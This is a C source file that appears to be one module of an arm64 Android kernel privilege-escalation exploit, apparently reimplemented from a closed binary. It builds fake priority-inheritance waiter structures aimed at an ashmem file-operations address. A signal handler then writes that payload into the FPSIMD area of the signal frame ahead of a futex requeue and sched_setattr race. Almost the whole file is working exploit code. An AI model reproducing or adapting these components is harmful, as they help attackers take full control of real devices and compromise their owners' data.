/* source: see sigusr1_payload.h for the full derivation and safety
 * reasoning. Uses the REAL NDK <sys/ucontext.h>/<asm/sigcontext.h>
 * struct definitions throughout -- deliberately does NOT hand-compute
 * any offset into ucontext_t/sigcontext (this project already found
 * and fixed one real bug this session caused by hand-computing an
 * offset instead of trusting a tool -- see futex_trigger.c's delay
 * table history -- not repeating that mistake here for something this
 * much more safety-sensitive). */
#define _GNU_SOURCE
#include <errno.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/ucontext.h>
#include <unistd.h>

#include "sigusr1_payload.h"

static unsigned char g_payload[SIGUSR1_PAYLOAD_SIZE];
static atomic_int g_handler_result; /* 0=not run yet, 1=success, -1=failed */

static void put64(unsigned char *base, size_t off, uint64_t value) {
  memcpy(base + off, &value, sizeof(value));
}

void sigusr1_build_waiter_phase_image(
    uint8_t out[SIGUSR1_PAYLOAD_SIZE], uint64_t parent, uint64_t right,
    uint64_t left, uint64_t task, uint64_t lock, uint32_t prio) {
  /* Local dst is record+0x10; closed source byte zero lands at record+0x18. */
  const size_t waiter_base = 0x18;

  memset(out, 0, SIGUSR1_PAYLOAD_SIZE);
  put64(out, waiter_base + 0x18, parent);
  put64(out, waiter_base + 0x20, right);
  put64(out, waiter_base + 0x28, left);
  put64(out, waiter_base + 0x30, task);
  put64(out, waiter_base + 0x38, lock);
  put64(out, waiter_base + 0x40, (uint64_t)prio << 32);
  put64(out, waiter_base + 0x48, 0);
  put64(out, waiter_base + 0x50, 0);
}

void sigusr1_build_waiter_phase(uint64_t parent, uint64_t right,
                                uint64_t left, uint64_t task,
                                uint64_t lock, uint32_t prio) {
  sigusr1_build_waiter_phase_image(g_payload, parent, right, left, task, lock,
                                   prio);
}

void sigusr1_build_payload(uint64_t page_base, uint64_t ashmem_misc_fops_addr) {
  memset(g_payload, 0, sizeof(g_payload));
  uint64_t pi_parent = page_base | 0x1180ULL;
  uint64_t pi_waiters_self_ref = page_base | 0x14e8ULL;
  uint64_t scratch_2380 = page_base | 0x2380ULL;
  uint64_t waiter_lock = page_base | 0x1390ULL;

  put64(g_payload, 0x18, pi_parent);
  put64(g_payload, 0x20, ashmem_misc_fops_addr);
  put64(g_payload, 0x28, 0);
  put64(g_payload, 0x30, pi_waiters_self_ref);
  put64(g_payload, 0x38, 0);
  put64(g_payload, 0x40, 0);
  put64(g_payload, 0x48, scratch_2380);
  put64(g_payload, 0x50, waiter_lock);
  put64(g_payload, 0x58, 0x8200000000ULL);
  put64(g_payload, 0x60, 0);
  put64(g_payload, 0x68, 0);
}

/* source: raw vaddr 0x3d6c-0x3e14 (the handler function itself, `e
 * asm.varsub=false`). Real algorithm, matching the KERNEL's own
 * parse_user_sigframe() validation style (magic+size checked, size
 * must be a sane positive value, scan bounded to a fixed limit) rather
 * than a naive first-match: this is deliberately not a shortcut, it
 * mirrors what was actually observed. The real handler keeps the
 * matching record pointer, finishes validating the record list, then
 * copies the 0x200-byte payload with ldrb/strb only. Keep this path
 * free of libc calls: besides matching the closed binary, it avoids a
 * lazy PLT resolution or a SIMD memcpy implementation inside the
 * signal frame that is being modified. */
static void sigusr1_handler(int sig, siginfo_t *info, void *ucontext_v) {
  (void)sig;
  (void)info;
  ucontext_t *uc = (ucontext_t *)ucontext_v;
  unsigned char *base = uc->uc_mcontext.__reserved;
  size_t limit = sizeof(uc->uc_mcontext.__reserved);
  size_t offset = 0;
  struct fpsimd_context *fpsimd = NULL;

  while (offset + sizeof(struct _aarch64_ctx) <= limit) {
    struct _aarch64_ctx *head = (struct _aarch64_ctx *)(base + offset);
    uint32_t magic = head->magic;
    uint32_t size = head->size;

    if (magic == 0 && size == 0) {
      break; /* end of the record list, real kernel uses the same sentinel */
    }
    if (size < sizeof(struct _aarch64_ctx) || (size & 0xf) != 0) {
      atomic_store(&g_handler_result, -1);
      return;
    }
    if (offset + size > limit) {
      atomic_store(&g_handler_result, -1);
      return;
    }
    if (magic == FPSIMD_MAGIC && size == sizeof(struct fpsimd_context)) {
      fpsimd = (struct fpsimd_context *)head;
    }
    offset += size;
  }
  if (fpsimd == NULL) {
    atomic_store(&g_handler_result, -1);
    return;
  }

  volatile unsigned char *dst = (volatile unsigned char *)fpsimd->vregs;
  volatile const unsigned char *src =
      (volatile const unsigned char *)g_payload;
  for (size_t i = 0; i < sizeof(g_payload); i++) {
    dst[i] = src[i];
  }
  atomic_store(&g_handler_result, 1);
}

int sigusr1_install_handler(void) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigusr1_handler;
  sa.sa_flags = SA_SIGINFO | SA_RESTART;
  sigemptyset(&sa.sa_mask);
  /* DiamondFox installs the FPSIMD frame-rewrite handler on signal 12
   * (SIGUSR2). Signal 10 is a separate no-op release signal used to
   * interrupt WAIT_REQUEUE_PI. */
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[sigusr1] sigaction failed errno=%d\n", errno);
    return 0;
  }
  return 1;
}

int sigusr1_fire_and_wait(void) {
  atomic_store(&g_handler_result, 0);

  pid_t pid = getpid();
  long tid = syscall(SYS_gettid);
  long ret = syscall(SYS_tgkill, pid, tid, SIGUSR2);
  if (ret != 0) {
    fprintf(stderr, "[sigusr1] tgkill failed errno=%d\n", errno);
    return 0;
  }

  /* tgkill targets this thread. Signal delivery and rt_sigreturn finish
   * before the syscall returns, exactly as assumed by the closed
   * binary at 0x40d4-0x40e4. Do not call libc or deschedule here: the
   * caller immediately opens the sched_setattr race window. */
  return atomic_load(&g_handler_result) == 1;
}
